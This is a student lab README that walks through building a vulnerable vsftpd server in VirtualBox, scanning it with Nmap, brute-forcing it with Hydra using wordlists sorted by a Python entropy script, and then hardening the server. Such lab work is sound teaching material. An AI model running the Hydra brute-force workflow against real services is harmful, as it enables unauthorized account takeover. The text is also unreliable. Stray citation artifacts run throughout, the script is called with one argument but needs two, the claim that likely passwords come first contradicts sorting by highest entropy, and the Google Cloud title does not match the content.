# Dictionaries, Scanning, and Hydra over FTP in Google Cloud/VirtualBox

## 📋 Project Description

[cite_start]This project documents the configuration and simulation of a controlled brute-force attack against an FTP service that uses clear-text authentication[cite: 19]. [cite_start]The goal of the practice is for the student to design, implement, and document a replicable didactic environment to experiment with the risks of non-encrypted protocols and the techniques of reconnaissance and brute force[cite: 19, 20].

[cite_start]The environment was implemented using **VirtualBox** [cite: 22, 26][cite_start], configuring a victim machine with a vulnerable FTP service (`vsftpd`) [cite: 27] [cite_start]and an attacker machine (Kali) with the necessary tools[cite: 21, 22].

### Key Objectives:
* [cite_start]Design and deploy both the victim machine (clear-text FTP service) and the attacker machine (tools for dictionary generation, entropy sorting, and controlled attacks)[cite: 21, 22].
* [cite_start]Use **Nmap** for reconnaissance of the FTP port[cite: 94].
* [cite_start]Generate and optimize password dictionaries using an **entropy** script[cite: 72, 91].
* [cite_start]Execute a controlled brute-force attack with **Hydra**[cite: 116, 144].
* [cite_start]Document the **cleaning and hardening** actions (closing port 21, removing the test user, disabling vsftpd) to prevent permanent vulnerabilities[cite: 171, 179, 180, 181, 182].

## 🛠️ Environment and Tools Used

* [cite_start]**Deployment Platform:** VirtualBox [cite: 26]
* **Services/Tools:**
    * [cite_start]`vsftpd`: FTP server on the victim machine[cite: 27].
    * [cite_start]`Hydra`: Brute-force attack tool[cite: 51].
    * [cite_start]`Nmap`: Port scanner[cite: 51].
    * [cite_start]`Python3`: For the dictionary optimization script[cite: 51, 72].
    * [cite_start]`Fail2Ban`: Hardening tool to mitigate attacks[cite: 172].
    * [cite_start]`Git`: To clone dictionaries[cite: 51].

---

## 💻 Step-by-Step Command Guide

### A. Victim Machine Configuration (FTP Service)

| Command | Description |
| :--- | :--- |
| `sudo apt install vsftpd -y` | [cite_start]Installs the clear-text FTP server[cite: 28]. |
| `sudo systemctl restart vsftpd` | [cite_start]Restarts the `vsftpd` service[cite: 31]. |
| `sudo systemctl enable vsftpd` | [cite_start]Enables the service to ensure it is always running[cite: 31]. |
| `sudo adduser ftpuser` | [cite_start]Creates the target user for the attack (Password: `ftp12345`)[cite: 35, 45]. |
| `sudo ufw allow 21/tcp` | [cite_start]Activates port 21 on the victim machine's firewall[cite: 93]. |

### B. Attacker Machine Configuration (Tools and Dictionaries)

| Command | Description |
| :--- | :--- |
| `sudo apt update` | [cite_start]Updates the package list[cite: 50]. |
| `sudo apt install hydra nmap git python3 python3-pip -y` | [cite_start]Installs the key tools[cite: 51]. |
| `mkdir ~/diccionarios` | [cite_start]Creates a directory to collect dictionaries[cite: 57]. |
| `cd ~/diccionarios` | [cite_start]Navigates to the newly created directory[cite: 58]. |
| `git clone https://github.com/danielmiessler/SecLists.git` | [cite_start]Downloads the SecLists dictionary repository[cite: 59, 60]. |
| `git clone https://github.com/berzerk0/Probable-Wordlists.git` | [cite_start]Downloads the Probable-Wordlists repository[cite: 61]. |

### C. Reconnaissance and Brute-Force Attack Phase

| Command | Description |
| :--- | :--- |
| `nmap -p 21 10.0.2.5` | [cite_start]Scans the victim machine to confirm that port 21 (ftp) is open[cite: 97, 102, 105]. |
| `python3 ordenar_entropia.py diccionario_top.txt` | [cite_start]Executes the entropy script to optimize the dictionary[cite: 114]. [cite_start]This ensures statistically more probable passwords are tried first[cite: 115]. |
| `hydra -l ftpuser -P diccionario_top.txt ftp://10.0.2.5 -o hydra_found.txt -t 4 -V` | [cite_start]Initiates the brute-force attack with Hydra against the FTP server[cite: 119]. [cite_start]Hydra performs fast, automated attempts until the correct password is found[cite: 144]. |

### D. Hardening and Cleanup (Post-Attack)

| Command | Description |
| :--- | :--- |
| `sudo apt install fail2ban -y` | [cite_start]Installs Fail2Ban on the victim machine[cite: 172, 175]. |
| `sudo systemctl enable fail2ban` | [cite_start]Enables the service to start automatically[cite: 177]. |
| `sudo systemctl start fail2ban` | [cite_start]Starts the Fail2Ban service[cite: 178]. |
| `sudo nano /etc/fail2ban/jail.local` | [cite_start]Edits the configuration to add the attacker's IP to the whitelist (`Ignoreip 10.0.2.15/24`) for controlled testing[cite: 188, 191]. |
| `sudo ufw delete allow 21/tcp` | [cite_start]**Closes port 21**[cite: 179]. |
| `sudo userdel -r ftpuser` | [cite_start]**Deletes the test user** (`ftpuser`)[cite: 180]. |
| `sudo systemctl disable vsftpd` | [cite_start]**Disables the vsftpd service**[cite: 181]. |

---

## 🐍 Optimization Script

[cite_start]The `ordenar_entropia.py` file is used to sort the password dictionary, prioritizing those with higher entropy to optimize the brute-force attack efficiency[cite: 91]:

```python
import math, sys
import collections

# Function to calculate the entropy (complexity) of a string (password)
def entropy(s):
    if not s:
        return 0 # cite: 77
    # Counts the frequency of each character in the string
    counter = collections.Counter(s) # cite: 79
    length = len(s) # cite: 80
    
    # Calculates Shannon entropy (in bits)
    # H = - Σ (p_i * log2(p_i))
    return -sum((count/length) * math.log2(count/length) for count in counter.values()) # cite: 81

# Main function to process files
def main(infile, outfile):
    # Reads the input file, ignoring encoding errors
    with open(infile, errors='ignore') as f: # cite: 83
        # Creates a list of unique, stripped passwords
        pw = [p.strip() for p in f if p.strip()] # cite: 84
    
    # Sorts the password list by entropy (highest to lowest)
    sorted_pw = sorted(set(pw), key=lambda x: entropy(x), reverse=True) # cite: 85
    
    # Writes the sorted passwords to the output file
    with open(outfile, 'w') as f: # cite: 86
        f.write('\n'.join(sorted_pw)) # cite: 87

# Script execution entry point
if __name__ == "__main__": # cite: 88, 89
    # Requires the input file name and output file name as arguments
    main(sys.argv[1], sys.argv[2]) # cite: 90
